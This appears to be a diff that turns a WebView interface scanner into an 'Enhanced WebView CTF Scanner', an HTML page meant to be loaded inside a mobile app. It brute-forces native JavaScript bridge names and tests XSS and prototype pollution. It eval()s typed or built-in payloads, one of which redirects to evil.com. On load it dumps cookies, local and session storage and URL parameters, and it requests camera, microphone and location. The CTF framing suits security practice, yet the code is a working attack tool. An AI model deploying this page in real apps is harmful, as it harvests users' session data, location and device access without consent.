@@ -1,550 +1,507 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebView Interface Scanner</title>
+    <title>Enhanced WebView CTF Scanner</title>
     <meta charset="utf-8">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Courier New', monospace;
             padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: #000;
+            color: #00ff00;
             margin: 0;
+            font-size: 12px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            background: rgba(0,20,0,0.9);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
         }
         .section {
-            background: rgba(255,255,255,0.05);
-            padding: 20px;
-            margin: 15px 0;
-            border-radius: 10px;
-            border-left: 4px solid #ff6b6b;
-        }
-        .success { border-left-color: #51cf66; background: rgba(81,207,102,0.2); }
-        .warning { border-left-color: #ffd43b; background: rgba(255,212,59,0.2); }
-        .info { border-left-color: #339af0; background: rgba(51,154,240,0.2); }
-        .critical { border-left-color: #ff3838; background: rgba(255,56,56,0.2); }
-        button {
-            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            margin: 5px;
-            transition: transform 0.2s;
-        }
-        button:hover { transform: scale(1.05); }
-        .code {
-            background: rgba(0,0,0,0.4);
+            background: rgba(0,40,0,0.3);
             padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
             margin: 10px 0;
-            overflow-x: auto;
-            font-size: 14px;
-            white-space: pre-wrap;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .interface-item {
-            background: rgba(255,255,255,0.1);
-            padding: 10px;
-            margin: 5px 0;
             border-radius: 5px;
-            border-left: 3px solid #51cf66;
+            border-left: 3px solid #ff0000;
         }
-        .dangerous { border-left-color: #ff3838; }
-        .interesting { border-left-color: #ffd43b; }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 10px 0;
+        .success { border-left-color: #00ff00; }
+        .warning { border-left-color: #ffff00; }
+        .info { border-left-color: #0099ff; }
+        .critical { border-left-color: #ff0000; }
+        button {
+            background: #004400;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 8px 16px;
+            border-radius: 3px;
+            cursor: pointer;
+            margin: 3px;
+            font-family: inherit;
+            font-size: 11px;
         }
-        th, td {
-            border: 1px solid rgba(255,255,255,0.3);
-            padding: 8px;
-            text-align: left;
+        button:hover { background: #006600; }
+        .code {
+            background: #001100;
+            padding: 10px;
+            border-radius: 3px;
+            font-family: inherit;
+            margin: 5px 0;
+            overflow-x: auto;
+            font-size: 11px;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #003300;
         }
-        th { background: rgba(255,255,255,0.2); }
-        .exploit-potential {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 5px;
-        }
-        .high { background: #ff3838; }
-        .medium { background: #ffd43b; }
-        .low { background: #51cf66; }
+        .exploit { color: #ff4444; font-weight: bold; }
+        .found { color: #ffff00; }
+        .data { color: #44ffff; }
         .hidden { display: none; }
+        input {
+            background: #001100;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 5px;
+            font-family: inherit;
+            margin: 3px;
+        }
+        .live-log {
+            height: 200px;
+            overflow-y: auto;
+            background: #000;
+            border: 1px solid #00ff00;
+            padding: 10px;
+            font-size: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🕸️ WebView JavaScript Interface Scanner</h1>
-        <p>Discovering available native app interfaces and exploitation opportunities</p>
+        <h1>[+] Enhanced WebView CTF Scanner v2.0</h1>
+        <div id="liveLog" class="live-log"></div>
         
+        <div class="section critical">
+            <h2>[!] Real Interface Discovery</h2>
+            <button onclick="scanRealInterfaces()">Scan Real Interfaces</button>
+            <button onclick="testXSS()">Test XSS Vectors</button>
+            <button onclick="extractData()">Extract All Data</button>
+            <button onclick="testMediaAccess()">Test Media Access</button>
+            <div id="realResults"></div>
+        </div>
+
         <div class="section warning">
-            <h2>🚨 Quick Scan</h2>
-            <button onclick="quickScan()">🔍 Quick Interface Scan</button>
-            <button onclick="deepScan()">🔬 Deep Environment Scan</button>
-            <button onclick="findHiddenAPIs()">🕵️ Find Hidden APIs</button>
-            <button onclick="testCommonInterfaces()">🎯 Test Common Interfaces</button>
-            <div id="quickResults"></div>
+            <h2>[*] Advanced Enumeration</h2>
+            <button onclick="bruteForceInterfaces()">Brute Force Interfaces</button>
+            <button onclick="testPrototypeChain()">Test Prototype Chain</button>
+            <button onclick="scanServiceWorkers()">Scan Service Workers</button>
+            <div id="advancedResults"></div>
         </div>
 
         <div class="section info">
-            <h2>📱 WebView Environment Detection</h2>
-            <div id="envResults">Click Quick Scan to analyze environment...</div>
-        </div>
-
-        <div class="section">
-            <h2>🔍 JavaScript Interface Discovery</h2>
-            <div id="interfaceResults">
-                <p>Scanning for available JavaScript interfaces...</p>
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>🎪 Window Object Analysis</h2>
-            <div id="windowResults">
-                <p>Analyzing window object for app-specific functions...</p>
-            </div>
-        </div>
-
-        <div class="section critical">
-            <h2>🔥 Potential Exploits Found</h2>
-            <div id="exploitResults">
-                <p>Run scans to identify exploitation opportunities...</p>
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>🛠️ Manual Testing Console</h2>
-            <input type="text" id="testInput" placeholder="Enter interface name to test (e.g., Android, webkit, app)" 
-                   style="width: 70%; padding: 10px; margin: 5px;">
-            <button onclick="testInterface()">Test Interface</button>
-            <div id="manualResults"></div>
+            <h2>[+] Payload Testing</h2>
+            <input type="text" id="payloadInput" placeholder="Enter custom payload" style="width: 60%;">
+            <button onclick="testPayload()">Execute Payload</button>
+            <button onclick="testCommonPayloads()">Test Common Payloads</button>
+            <div id="payloadResults"></div>
         </div>
 
         <div class="section success">
-            <h2>📋 Complete Report</h2>
-            <button onclick="generateReport()">📄 Generate Full Report</button>
-            <div id="fullReport" class="hidden">
-                <div class="code" id="reportContent"></div>
-            </div>
+            <h2>[+] Data Extraction Results</h2>
+            <div id="dataResults"></div>
         </div>
     </div>
 
     <script>
-        let discoveredInterfaces = [];
-        let exploitOpportunities = [];
-        let scanResults = {};
+        let logDiv = document.getElementById('liveLog');
+        let realInterfaces = [];
+        let sensitiveData = {};
 
         function log(message, type = 'info') {
-            console.log(message);
             const timestamp = new Date().toLocaleTimeString();
-            return '[' + timestamp + '] ' + message;
+            const colors = {
+                'info': '#00ff00',
+                'warning': '#ffff00', 
+                'error': '#ff0000',
+                'success': '#44ff44',
+                'data': '#44ffff'
+            };
+            
+            logDiv.innerHTML += `<div style="color: ${colors[type] || '#00ff00'}">[${timestamp}] ${message}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(message);
         }
 
-        function quickScan() {
-            const resultsDiv = document.getElementById('quickResults');
-            resultsDiv.innerHTML = '<p>🔍 Running quick scan...</p>';
-            
-            let results = '<h3>Quick Scan Results:</h3>';
+        function scanRealInterfaces() {
+            log('[+] Starting real interface discovery...', 'info');
+            const resultsDiv = document.getElementById('realResults');
+            let results = '';
             let foundCount = 0;
-            
-            // Common WebView interfaces
-            const commonInterfaces = [
+
+            // Filter out our own functions to avoid false positives
+            const ourFunctions = [
+                'quickScan', 'deepScan', 'findHiddenAPIs', 'testCommonInterfaces', 
+                'testInterface', 'analyzeEnvironment', 'generateReport', 'log',
+                'scanRealInterfaces', 'testXSS', 'extractData', 'testMediaAccess',
+                'bruteForceInterfaces', 'testPrototypeChain', 'scanServiceWorkers',
+                'testPayload', 'testCommonPayloads'
+            ];
+
+            // Real interface discovery
+            const realTargets = [
                 'Android', 'webkit', 'app', 'bridge', 'nativeApp', 'mobile',
                 'ctf', 'ctfapp', 'CTF', 'CTFAPP', 'native', 'client',
-                'AppInterface', 'NativeBridge', 'WebViewInterface'
+                'AppInterface', 'NativeBridge', 'WebViewInterface', 'JSInterface',
+                'NativeInterface', 'AppBridge', 'MobileBridge', 'CTFInterface'
             ];
-            
-            commonInterfaces.forEach(name => {
-                if (window[name]) {
-                    results += '<div class="interface-item dangerous">🚨 <strong>' + name + '</strong> - Available!</div>';
-                    discoveredInterfaces.push(name);
+
+            realTargets.forEach(name => {
+                if (window[name] && typeof window[name] === 'object') {
+                    log(`[!] REAL INTERFACE FOUND: ${name}`, 'error');
+                    results += `<div class="exploit">[!] ${name} - REAL INTERFACE!</div>`;
+                    realInterfaces.push(name);
                     foundCount++;
+
+                    // Enumerate methods
+                    try {
+                        const methods = Object.getOwnPropertyNames(window[name]);
+                        methods.forEach(method => {
+                            if (typeof window[name][method] === 'function') {
+                                log(`  [+] Method: ${name}.${method}()`, 'warning');
+                                results += `<div class="found">  [+] ${name}.${method}()</div>`;
+                            }
+                        });
+                    } catch (e) {
+                        log(`  [!] Error enumerating ${name}: ${e.message}`, 'error');
+                    }
                 }
             });
-            
-            // Check for webkit message handlers
+
+            // Check webkit message handlers (iOS)
             if (window.webkit && window.webkit.messageHandlers) {
-                results += '<div class="interface-item dangerous">🚨 <strong>webkit.messageHandlers</strong> - Available!</div>';
+                log('[!] WEBKIT MESSAGE HANDLERS FOUND!', 'error');
+                results += `<div class="exploit">[!] webkit.messageHandlers - iOS INTERFACE!</div>`;
                 const handlers = Object.keys(window.webkit.messageHandlers);
                 handlers.forEach(handler => {
-                    results += '<div class="interface-item interesting">📱 Handler: <strong>' + handler + '</strong></div>';
-                    discoveredInterfaces.push('webkit.messageHandlers.' + handler);
+                    log(`  [+] Handler: ${handler}`, 'warning');
+                    results += `<div class="found">  [+] Handler: ${handler}</div>`;
+                    foundCount++;
                 });
-                foundCount += handlers.length;
             }
-            
-            if (foundCount === 0) {
-                results += '<div class="interface-item">❌ No common interfaces found in quick scan</div>';
-            } else {
-                results += '<div class="interface-item success">✅ Found ' + foundCount + ' potential interfaces!</div>';
-            }
-            
-            resultsDiv.innerHTML = results;
-            analyzeEnvironment();
-        }
 
-        function deepScan() {
-            const resultsDiv = document.getElementById('windowResults');
-            resultsDiv.innerHTML = '<p>🔬 Performing deep window object scan...</p>';
-            
-            let results = '<h3>Window Object Analysis:</h3>';
-            let suspiciousProps = [];
-            
-            // Scan all window properties
+            // Scan window properties more intelligently
             for (let prop in window) {
+                if (ourFunctions.includes(prop)) continue;
+                
                 try {
                     const value = window[prop];
                     const type = typeof value;
                     
-                    // Look for suspicious property names
-                    const suspicious = /android|webkit|app|native|bridge|ctf|mobile|client|interface/i.test(prop);
-                    
-                    if (suspicious) {
-                        suspiciousProps.push({
-                            name: prop,
-                            type: type,
-                            value: value,
-                            suspicious: true
+                    // Look for custom objects with methods
+                    if (type === 'object' && value !== null && value !== window && value !== document) {
+                        const methods = Object.getOwnPropertyNames(value).filter(p => {
+                            try {
+                                return typeof value[p] === 'function' && !p.startsWith('_');
+                            } catch {
+                                return false;
+                            }
                         });
-                    }
-                    
-                    // Look for functions that might be app-specific
-                    if (type === 'function' && !prop.startsWith('_') && prop.length > 2) {
-                        const funcStr = value.toString();
-                        if (funcStr.includes('[native code]') || funcStr.length < 50) {
-                            suspiciousProps.push({
-                                name: prop,
-                                type: 'native function',
-                                value: funcStr.substring(0, 100),
-                                suspicious: false
-                            });
-                        }
-                    }
-                    
-                    // Look for objects with multiple methods
-                    if (type === 'object' && value !== null && value !== window) {
-                        const methods = Object.getOwnPropertyNames(value).filter(p => typeof value[p] === 'function');
-                        if (methods.length > 2 && methods.length < 20) {
-                            suspiciousProps.push({
-                                name: prop,
-                                type: 'object with ' + methods.length + ' methods',
-                                value: methods.join(', '),
-                                suspicious: false
-                            });
+                        
+                        if (methods.length > 0 && methods.length < 50) {
+                            // Exclude common DOM objects
+                            if (!value.nodeType && !value.toString().includes('[object HTML') && 
+                                !value.toString().includes('[object CSS') &&
+                                prop !== 'console' && prop !== 'navigator' && prop !== 'location') {
+                                
+                                log(`[?] Suspicious object: ${prop} (${methods.length} methods)`, 'warning');
+                                results += `<div class="found">[?] ${prop}: ${methods.slice(0,5).join(', ')}${methods.length > 5 ? '...' : ''}</div>`;
+                            }
                         }
                     }
                 } catch (e) {
-                    // Property access failed - might be restricted
+                    // Access restricted - potentially interesting
+                    log(`[!] Restricted property: ${prop}`, 'error');
                 }
             }
-            
-            // Display results
-            suspiciousProps.forEach(prop => {
-                const className = prop.suspicious ? 'dangerous' : 'interesting';
-                const icon = prop.suspicious ? '🚨' : '🔍';
-                results += '<div class="interface-item ' + className + '">' + icon + ' <strong>' + prop.name + '</strong> (' + prop.type + ')<br>';
-                results += '<small>' + (prop.value || '').toString().substring(0, 200) + '</small></div>';
-            });
-            
-            if (suspiciousProps.length === 0) {
-                results += '<div class="interface-item">❌ No suspicious properties found</div>';
+
+            if (foundCount === 0) {
+                results += '<div>[+] No obvious interfaces found - app may use indirect communication</div>';
+                log('[+] No obvious interfaces found', 'info');
             }
-            
+
             resultsDiv.innerHTML = results;
-            scanResults.windowScan = suspiciousProps;
         }
 
-        function findHiddenAPIs() {
-            const resultsDiv = document.getElementById('interfaceResults');
-            resultsDiv.innerHTML = '<p>🕵️ Searching for hidden APIs...</p>';
+        function testXSS() {
+            log('[+] Testing XSS vectors...', 'info');
+            const resultsDiv = document.getElementById('realResults');
             
-            let results = '<h3>Hidden API Discovery:</h3>';
-            let found = [];
-            
-            // Common hidden interface patterns
-            const patterns = [
-                'window._', 'window.__', 'window.$',
-                'document._', 'navigator._',
-                'console._', 'location._'
-            ];
-            
-            patterns.forEach(pattern => {
+            // Test basic XSS
+            try {
+                const xssTest = document.createElement('div');
+                xssTest.innerHTML = '<img src=x onerror=console.log("XSS_WORKS")>';
+                document.body.appendChild(xssTest);
+                log('[+] Basic XSS payload injected', 'success');
+                
+                // Test if we can access parent frames
                 try {
-                    const parts = pattern.split('.');
-                    let obj = window;
-                    for (let i = 1; i < parts.length - 1; i++) {
-                        obj = obj[parts[i]];
-                        if (!obj) break;
-                    }
-                    
-                    if (obj) {
-                        const props = Object.getOwnPropertyNames(obj).filter(p => p.startsWith('_'));
-                        props.forEach(prop => {
-                            if (obj[prop] && typeof obj[prop] === 'function') {
-                                found.push(pattern.replace('_', prop));
-                                results += '<div class="interface-item interesting">🔍 Hidden function: <strong>' + pattern.replace('_', prop) + '</strong></div>';
-                            }
-                        });
+                    if (window.parent !== window) {
+                        log('[!] Frame detected - testing parent access', 'warning');
+                        try {
+                            const parentDomain = window.parent.location.href;
+                            log(`[!] Parent accessible: ${parentDomain}`, 'error');
+                        } catch (e) {
+                            log('[+] Parent blocked by CORS', 'info');
+                        }
                     }
                 } catch (e) {}
-            });
+                
+                document.body.removeChild(xssTest);
+            } catch (e) {
+                log(`[!] XSS blocked: ${e.message}`, 'warning');
+            }
+        }
+
+        function extractData() {
+            log('[+] Extracting all available data...', 'info');
+            const resultsDiv = document.getElementById('dataResults');
+            let dataOutput = '';
+
+            // Extract localStorage
+            try {
+                if (typeof localStorage !== 'undefined') {
+                    log('[+] Dumping localStorage...', 'data');
+                    dataOutput += '<div class="data">[+] LOCAL STORAGE:</div>';
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        log(`  ${key}: ${value}`, 'data');
+                        dataOutput += `<div class="code">${key}: ${value}</div>`;
+                    }
+                    if (localStorage.length === 0) {
+                        dataOutput += '<div>  [empty]</div>';
+                    }
+                }
+            } catch (e) {
+                log(`[!] localStorage error: ${e.message}`, 'error');
+            }
+
+            // Extract sessionStorage
+            try {
+                if (typeof sessionStorage !== 'undefined') {
+                    log('[+] Dumping sessionStorage...', 'data');
+                    dataOutput += '<div class="data">[+] SESSION STORAGE:</div>';
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        log(`  ${key}: ${value}`, 'data');
+                        dataOutput += `<div class="code">${key}: ${value}</div>`;
+                    }
+                    if (sessionStorage.length === 0) {
+                        dataOutput += '<div>  [empty]</div>';
+                    }
+                }
+            } catch (e) {
+                log(`[!] sessionStorage error: ${e.message}`, 'error');
+            }
+
+            // Extract cookies
+            try {
+                log('[+] Dumping cookies...', 'data');
+                dataOutput += '<div class="data">[+] COOKIES:</div>';
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    cookies.forEach(cookie => {
+                        log(`  ${cookie.trim()}`, 'data');
+                        dataOutput += `<div class="code">${cookie.trim()}</div>`;
+                    });
+                } else {
+                    dataOutput += '<div>  [no cookies]</div>';
+                }
+            } catch (e) {
+                log(`[!] Cookie error: ${e.message}`, 'error');
+            }
+
+            // Extract URL parameters
+            try {
+                log('[+] Dumping URL parameters...', 'data');
+                dataOutput += '<div class="data">[+] URL PARAMETERS:</div>';
+                const params = new URLSearchParams(window.location.search);
+                let hasParams = false;
+                for (const [key, value] of params) {
+                    log(`  ${key}: ${value}`, 'data');
+                    dataOutput += `<div class="code">${key}: ${value}</div>`;
+                    hasParams = true;
+                }
+                if (!hasParams) {
+                    dataOutput += '<div>  [no parameters]</div>';
+                }
+            } catch (e) {
+                log(`[!] URL parameter error: ${e.message}`, 'error');
+            }
+
+            resultsDiv.innerHTML = dataOutput;
+        }
+
+        function testMediaAccess() {
+            log('[+] Testing media device access...', 'info');
             
-            // Check for prototype pollution/extensions
-            const prototypes = [HTMLElement, Document, Window, Navigator];
+            // Test camera access
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                log('[!] getUserMedia available - testing camera...', 'warning');
+                
+                navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                    .then(stream => {
+                        log('[!] CAMERA ACCESS GRANTED!', 'error');
+                        // Stop the stream immediately
+                        stream.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(err => {
+                        log(`[+] Camera access denied: ${err.message}`, 'info');
+                    });
+            }
+
+            // Test geolocation
+            if (navigator.geolocation) {
+                log('[!] Geolocation available - testing...', 'warning');
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        log(`[!] LOCATION OBTAINED: ${position.coords.latitude}, ${position.coords.longitude}`, 'error');
+                    },
+                    error => {
+                        log(`[+] Geolocation denied: ${error.message}`, 'info');
+                    },
+                    {timeout: 5000}
+                );
+            }
+
+            // Test device motion
+            if (typeof DeviceMotionEvent !== 'undefined') {
+                log('[!] DeviceMotionEvent available', 'warning');
+                window.addEventListener('devicemotion', (event) => {
+                    log(`[!] DEVICE MOTION: x=${event.acceleration.x}`, 'error');
+                }, {once: true});
+            }
+        }
+
+        function bruteForceInterfaces() {
+            log('[+] Brute forcing interface names...', 'info');
+            const resultsDiv = document.getElementById('advancedResults');
+            let results = '';
+
+            // Common interface name patterns
+            const prefixes = ['', 'app', 'native', 'ctf', 'mobile', 'bridge', 'interface', 'api'];
+            const suffixes = ['', 'Interface', 'Bridge', 'API', 'App', 'Native', 'Handler'];
+            const words = ['CTF', 'App', 'Native', 'Bridge', 'Interface', 'API', 'Handler', 'Client', 'Service'];
+
+            const combinations = [];
+            
+            // Generate combinations
+            prefixes.forEach(prefix => {
+                words.forEach(word => {
+                    suffixes.forEach(suffix => {
+                        const name = prefix + word + suffix;
+                        if (name && name.length > 2) {
+                            combinations.push(name);
+                        }
+                    });
+                });
+            });
+
+            // Test each combination
+            let found = 0;
+            combinations.forEach(name => {
+                if (window[name] && typeof window[name] === 'object') {
+                    log(`[!] BRUTE FORCE HIT: ${name}`, 'error');
+                    results += `<div class="exploit">[!] FOUND: ${name}</div>`;
+                    found++;
+                }
+            });
+
+            if (found === 0) {
+                results += '<div>[+] No interfaces found via brute force</div>';
+            }
+
+            resultsDiv.innerHTML = results;
+        }
+
+        function testPrototypeChain() {
+            log('[+] Testing prototype chain pollution...', 'info');
+            
+            try {
+                // Test if we can pollute prototypes
+                Object.prototype.polluted = 'test';
+                if (({}).polluted === 'test') {
+                    log('[!] PROTOTYPE POLLUTION POSSIBLE!', 'error');
+                    delete Object.prototype.polluted;
+                }
+            } catch (e) {
+                log(`[+] Prototype pollution blocked: ${e.message}`, 'info');
+            }
+
+            // Check for extended prototypes
+            const prototypes = [Window, Document, HTMLElement, Navigator];
             prototypes.forEach(proto => {
                 const props = Object.getOwnPropertyNames(proto.prototype);
                 props.forEach(prop => {
-                    if (/app|native|bridge|ctf/i.test(prop)) {
-                        found.push(proto.name + '.prototype.' + prop);
-                        results += '<div class="interface-item dangerous">🚨 Extended prototype: <strong>' + proto.name + '.' + prop + '</strong></div>';
+                    if (/app|native|bridge|ctf|interface/i.test(prop)) {
+                        log(`[!] Extended prototype: ${proto.name}.${prop}`, 'warning');
                     }
                 });
             });
-            
-            if (found.length === 0) {
-                results += '<div class="interface-item">❌ No hidden APIs discovered</div>';
-            }
-            
-            resultsDiv.innerHTML = results;
-            scanResults.hiddenAPIs = found;
         }
 
-        function testCommonInterfaces() {
-            const resultsDiv = document.getElementById('exploitResults');
-            resultsDiv.innerHTML = '<p>🎯 Testing common WebView interfaces...</p>';
+        function testPayload() {
+            const payload = document.getElementById('payloadInput').value;
+            if (!payload) return;
             
-            let results = '<h3>Interface Testing Results:</h3>';
-            let vulnerabilities = [];
-            
-            // Test Android WebView interfaces
-            if (window.Android) {
-                results += '<div class="interface-item critical">🔥 <strong>Android interface found!</strong></div>';
-                
-                // Test common Android methods
-                const androidMethods = ['openApp', 'getDeviceInfo', 'makeCall', 'sendSMS', 'getLocation', 'openURL', 'showToast'];
-                androidMethods.forEach(method => {
-                    if (typeof window.Android[method] === 'function') {
-                        vulnerabilities.push('Android.' + method + '() - Potential app control');
-                        results += '<div class="interface-item dangerous">🚨 <strong>Android.' + method + '</strong> - Available!</div>';
-                    }
-                });
-            }
-            
-            // Test WebKit message handlers
-            if (window.webkit && window.webkit.messageHandlers) {
-                Object.keys(window.webkit.messageHandlers).forEach(handler => {
-                    results += '<div class="interface-item critical">🔥 <strong>webkit.messageHandlers.' + handler + '</strong></div>';
-                    vulnerabilities.push('webkit.messageHandlers.' + handler + ' - Message passing to native app');
-                    
-                    // Try to call it
-                    try {
-                        window.webkit.messageHandlers[handler].postMessage('test');
-                        results += '<div class="interface-item dangerous">✅ Successfully called ' + handler + '</div>';
-                    } catch (e) {
-                        results += '<div class="interface-item warning">⚠️ ' + handler + ' callable but requires specific format</div>';
-                    }
-                });
-            }
-            
-            // Test for custom app interfaces
-            const customTests = ['ctfapp', 'CTFApp', 'app', 'nativeApp', 'bridge'];
-            customTests.forEach(name => {
-                if (window[name]) {
-                    results += '<div class="interface-item critical">🔥 <strong>' + name + ' interface found!</strong></div>';
-                    
-                    // Enumerate methods
-                    const methods = Object.getOwnPropertyNames(window[name]).filter(p => typeof window[name][p] === 'function');
-                    methods.forEach(method => {
-                        vulnerabilities.push(name + '.' + method + '() - Custom app function');
-                        results += '<div class="interface-item dangerous">🚨 Method: <strong>' + name + '.' + method + '</strong></div>';
-                    });
-                }
-            });
-            
-            exploitOpportunities = vulnerabilities;
-            
-            if (vulnerabilities.length === 0) {
-                results += '<div class="interface-item">✅ No obvious vulnerabilities found</div>';
-            } else {
-                results += '<div class="interface-item critical">🚨 <strong>' + vulnerabilities.length + ' potential vulnerabilities discovered!</strong></div>';
-            }
-            
-            resultsDiv.innerHTML = results;
-        }
-
-        function testInterface() {
-            const interfaceName = document.getElementById('testInput').value.trim();
-            const resultsDiv = document.getElementById('manualResults');
-            
-            if (!interfaceName) {
-                resultsDiv.innerHTML = '<div class="interface-item warning">⚠️ Please enter an interface name</div>';
-                return;
-            }
-            
-            let results = '<h3>Testing: ' + interfaceName + '</h3>';
+            log(`[+] Testing payload: ${payload}`, 'info');
             
             try {
-                // Try to access the interface
-                const parts = interfaceName.split('.');
-                let obj = window;
-                
-                for (let part of parts) {
-                    obj = obj[part];
-                    if (obj === undefined) {
-                        results += '<div class="interface-item warning">❌ ' + interfaceName + ' not found</div>';
-                        resultsDiv.innerHTML = results;
-                        return;
-                    }
-                }
-                
-                results += '<div class="interface-item success">✅ ' + interfaceName + ' exists!</div>';
-                results += '<div class="interface-item info">Type: ' + typeof obj + '</div>';
-                
-                if (typeof obj === 'function') {
-                    results += '<div class="interface-item">Function signature: <code>' + obj.toString().substring(0, 200) + '</code></div>';
-                } else if (typeof obj === 'object' && obj !== null) {
-                    const props = Object.getOwnPropertyNames(obj);
-                    results += '<div class="interface-item">Properties/Methods: ' + props.join(', ') + '</div>';
-                    
-                    // Test each method
-                    props.forEach(prop => {
-                        if (typeof obj[prop] === 'function') {
-                            results += '<div class="interface-item interesting">🔍 Method: <strong>' + prop + '</strong></div>';
-                        }
-                    });
-                }
-                
-            } catch (error) {
-                results += '<div class="interface-item warning">⚠️ Error accessing ' + interfaceName + ': ' + error.message + '</div>';
+                const result = eval(payload);
+                log(`[+] Payload result: ${result}`, 'success');
+            } catch (e) {
+                log(`[!] Payload error: ${e.message}`, 'error');
             }
-            
-            resultsDiv.innerHTML = results;
         }
 
-        function analyzeEnvironment() {
-            const resultsDiv = document.getElementById('envResults');
+        function testCommonPayloads() {
+            log('[+] Testing common exploit payloads...', 'info');
             
-            let analysis = '<h3>Environment Analysis:</h3>';
-            analysis += '<table>';
-            analysis += '<tr><th>Property</th><th>Value</th><th>Risk Level</th></tr>';
-            
-            const checks = [
-                {
-                    name: 'User Agent',
-                    value: navigator.userAgent,
-                    risk: /WebView|wv/.test(navigator.userAgent) ? 'high' : 'low'
-                },
-                {
-                    name: 'Platform',
-                    value: navigator.platform,
-                    risk: 'low'
-                },
-                {
-                    name: 'App Context',
-                    value: window.Android ? 'Android App' : (window.webkit ? 'iOS App' : 'Browser'),
-                    risk: (window.Android || window.webkit) ? 'high' : 'low'
-                },
-                {
-                    name: 'JavaScript Enabled',
-                    value: 'Yes',
-                    risk: 'medium'
-                },
-                {
-                    name: 'Local Storage',
-                    value: typeof localStorage !== 'undefined' ? 'Available' : 'Blocked',
-                    risk: 'medium'
-                },
-                {
-                    name: 'Geolocation',
-                    value: typeof navigator.geolocation !== 'undefined' ? 'Available' : 'Blocked',
-                    risk: 'medium'
-                },
-                {
-                    name: 'Camera/Media',
-                    value: typeof navigator.mediaDevices !== 'undefined' ? 'Available' : 'Blocked',
-                    risk: 'high'
-                }
+            const payloads = [
+                'window.location = "http://evil.com"',
+                'document.cookie',
+                'navigator.userAgent',
+                'window.history.length',
+                'screen.width + "x" + screen.height',
+                'Object.keys(window).length'
             ];
-            
-            checks.forEach(check => {
-                analysis += '<tr>';
-                analysis += '<td>' + check.name + '</td>';
-                analysis += '<td>' + check.value + '</td>';
-                analysis += '<td><span class="exploit-potential ' + check.risk + '"></span>' + check.risk.toUpperCase() + '</td>';
-                analysis += '</tr>';
+
+            payloads.forEach(payload => {
+                try {
+                    const result = eval(payload);
+                    log(`[+] ${payload} = ${result}`, 'data');
+                } catch (e) {
+                    log(`[!] ${payload} failed: ${e.message}`, 'error');
+                }
             });
-            
-            analysis += '</table>';
-            resultsDiv.innerHTML = analysis;
         }
 
-        function generateReport() {
-            const reportDiv = document.getElementById('fullReport');
-            const reportContent = document.getElementById('reportContent');
-            
-            let report = 'WEBVIEW JAVASCRIPT INTERFACE PENETRATION TEST REPORT\n';
-            report += '=' * 60 + '\n\n';
-            report += 'Timestamp: ' + new Date().toISOString() + '\n';
-            report += 'Target: ' + window.location.href + '\n';
-            report += 'User Agent: ' + navigator.userAgent + '\n\n';
-            
-            report += 'DISCOVERED INTERFACES:\n';
-            report += '-' * 30 + '\n';
-            if (discoveredInterfaces.length > 0) {
-                discoveredInterfaces.forEach(interface => {
-                    report += '- ' + interface + '\n';
-                });
-            } else {
-                report += 'No interfaces discovered\n';
-            }
-            
-            report += '\nPOTENTIAL EXPLOITS:\n';
-            report += '-' * 30 + '\n';
-            if (exploitOpportunities.length > 0) {
-                exploitOpportunities.forEach(exploit => {
-                    report += '- ' + exploit + '\n';
-                });
-            } else {
-                report += 'No obvious exploits found\n';
-            }
-            
-            report += '\nRECOMMENDATIONS:\n';
-            report += '-' * 30 + '\n';
-            report += '1. Test each discovered interface for unauthorized access\n';
-            report += '2. Attempt to call discovered methods with various parameters\n';
-            report += '3. Look for information disclosure through interface responses\n';
-            report += '4. Test for privilege escalation through native functions\n';
-            report += '5. Check if interfaces can access device capabilities\n';
-            
-            reportContent.textContent = report;
-            reportDiv.classList.remove('hidden');
-        }
-
-        // Auto-run basic scans on load
+        // Auto-run on load
         window.onload = function() {
-            log('WebView Interface Scanner loaded');
-            setTimeout(quickScan, 1000);
-            setTimeout(deepScan, 2000);
-            setTimeout(findHiddenAPIs, 3000);
-            setTimeout(testCommonInterfaces, 4000);
+            log('[+] Enhanced WebView CTF Scanner loaded', 'success');
+            log('[+] Ready for exploitation...', 'info');
+            
+            // Auto-run basic scans
+            setTimeout(() => {
+                scanRealInterfaces();
+                extractData();
+                testMediaAccess();
+            }, 1000);
         };
     </script>
 </body>
 </html>
-
